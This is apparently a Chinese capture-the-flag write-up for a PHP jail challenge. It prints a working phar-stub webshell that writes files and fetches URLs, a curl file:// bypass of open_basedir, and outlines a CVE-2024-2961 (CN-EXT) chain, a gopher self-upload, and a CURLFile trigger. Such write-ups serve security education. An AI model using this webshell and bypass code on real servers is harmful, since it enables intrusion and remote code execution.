# php_jail_is_my_cry

**出题**：Kengwang

**难度**：中等

## 题目描述

PHP Jail is my CRY

> 请注意附件中的代码存在一行需要你补充的代码, 已经注释表明, 否则会存在问题
>
> 本题不出网, 最终需要执行 /readflag

## Hints

- 并没有开启 allow_url_include [2025-08-16 01:00:08]

## 部署注意事项

本题不出网

## Writeup

> Break out the jail and hear my CURL cry

本题其实给了 Docker 环境, 建议在本地打一遍, 将 Error 类从黑名单中移除, 这样能在日志看到报错

我们先说一下预期解, 再把大家可能遇到的问题给解决一下。

预期的思路：

1. 利用 phar include gz 压缩解析漏洞上马 (仅能通过 curl 读文件, `file_put_contents` 写文件)
2. 利用 curl 绕过 open_basedir 读取 `/proc/self/maps`
3. 利用 include 函数拆解 payload 打 CN-EXT (CVE-2024-2961)

大致分为这三步，但是中间还是有很多细节上的东西。因为本次使用了 PHP 8.3.0 高版本导致很多之前的特性都用不了，之后我们也会详细谈谈为什么选取这个版本。

### 第一步

我们参考文章 [当include邂逅phar——DeadsecCTF2025 baby-web.pdf](https://wx.zsxq.com/group/2212251881/topic/1524844181242522) [可选外链: https://xz.aliyun.com/news/18584]

我们可以通过下面代码生成一个可用的恶意 Phar, 将马写到 Stub 中

```php
<?php
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->setStub(
'
<?php echo 111;
if ($_GET[0] == 0){
file_put_contents($_POST[0], $_POST[1]);
}
if ($_GET[0] == 1){
$orig = $_POST[0];
$ch = curl_init($orig);
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
echo $data;
curl_close($ch);
}
__HALT_COMPILER(); ?>
'
);
$phar->addFromString('kengwang', '111');
$phar->stopBuffering();
?>
```

之后再通过 gzip 压缩

```shell
gzip -c payload.phar > shell.phar
```

我们上传后即可使用这个马

### 第二步

这个绕过 `open_basedir` 很容易就能在网上搜索到: [open_basedir bypass using curl extension](https://github.com/php/php-src/issues/16802)

加了个这个的原因是在 PHP 8.3 这种高版本中还存在过这样的绕过漏洞，并且似乎国内还没人提到？

> 这个也只是做个分享吧，也都没藏了，马写上去之后都是可以读到我的 `index.php` 写的

我们可以利用

```php
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
```

再加上 `file://` 协议即可绕过 open_basedir 的限制，可以读取任意的文件。

利用：

```php
$orig = $_POST[0];
$ch = curl_init($orig);
curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
echo $data;
curl_close($ch);
```

我们可以读取任意的文件

### 第三步

其实很多师傅到这里应该都想到了 cn-ext, 毕竟题目明示了要 RCE，但现在唯独缺少的就是合适的触发点和触发方法。

我们很明显就注意到了 `include`

但是现在有个亟待解决的问题就是: 我们并未开启 `allow_url_include`, 也就是说我们包含的内容必须最终指向一个文件, 而 cn-ext 脚本所生成的最终是落到了一个 data 上, include 会被拒绝导致无法触发。

但是我们现在是有 `file_put_contents` 在限制的目录下写内容, 我们可以将这需要通过 filter chain 的内容写到一个文件中, 然后再讲原始 filter chain 的来源指向这个文件, 同样也能触发.

我们可以直接使用 kezibei 的生成脚本来在本地生成这样一个文件, 可以不用花时间改原来脚本中繁琐的 `check_vuln` 还有交互式获取文件内容。我们只需要让其执行 `/readflag > /tmp/flag` 即可

> 脚本生成 Payload 不再赘述

题解结束

下面是对一个情况的讨论:

* 为什么我尝试使用 gopher 攻击 fpm 并不奏效

可以参考 [P神的解释](https://wx.zsxq.com/group/2212251881/topic/2852124428812211)

或者你也可以参考这个 [Issue](https://github.com/curl/curl/issues/14219)

简而言之, gopher 支持 NULL byte 并不是一个预期的行为, 在 RFC 中明确规定了 gopher 的 url 不应当支持 NULL byte, 但是在某一个版本的 cURL 却开始错误的允许了这个行为. 当然之后也被重新限制 (在 [7.45.0,7.71.0] 期间可以发送, 在 [此 Commit](https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2) 中修复, 在 [此 Commit](https://github.com/curl/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195) 被引入 by @orangetw)

而我们要攻击 php-fpm 必须要使用到 NULL byte, 故这样的 gopher url 在新版本中并不能成功发送。

下面是对两个非预期解题方法的披露

* 第一步的落马 (by IHK-1)

观察到我们存在从 URL 读取文件内容后并没有进行文件内容过滤, 我们可以让这个 URL 的内容包含我们的木马.

观察到当前页面在上传成功文件后会将文件名显示出来, 我们考虑构造一个上传包, 将文件名改为木马, 并且下载这个上传成功的页面.

这个时候我们的 gopher 协议可以登场了, 我们可以用 gopher 协议对 `127.0.0.1:80` 发起一个上传文件包, 将文件名写为木马的名字, 此时获取到的内容中就包含了木马了. 在结尾处我们加上一个 `%0D%0A/shell`, 让 basename 后的文件名正常一点. 我们就可以用这个木马文件来进行操作了

* 最后一步的触发

通过对 `get_declared_classes` 解除禁用, 与黑名单对照, 发现少 ban 了 `CURLFile`, 通过对 PHP 源码的审计, 发现 `CURLFile` 是由 PHP 解析, 并且能够走到 filter 解析逻辑中的, 故我们也可以使用这个 CURLFile 来触发 CN-EXT

```php
<?php
$cu = curl_init('http://localhost/');
curl_setopt($cu, CURLOPT_RETURNTRANSFER, true);
curl_setopt($cu, CURLOPT_POST, true);
$f = new CURLFile($_POST[0]);
curl_setopt($cu, CURLOPT_POSTFIELDS, [
    'f' => $f,
]);
$data = curl_exec($cu);
echo $data;
```

所以, 其实最符合题目, 最 cURL 的一个解题方法是:

* 利用 curl 下载 gopher 下马
* 利用 curl 绕过 open_basedir
* 利用 CURLFile 触发 cn-ext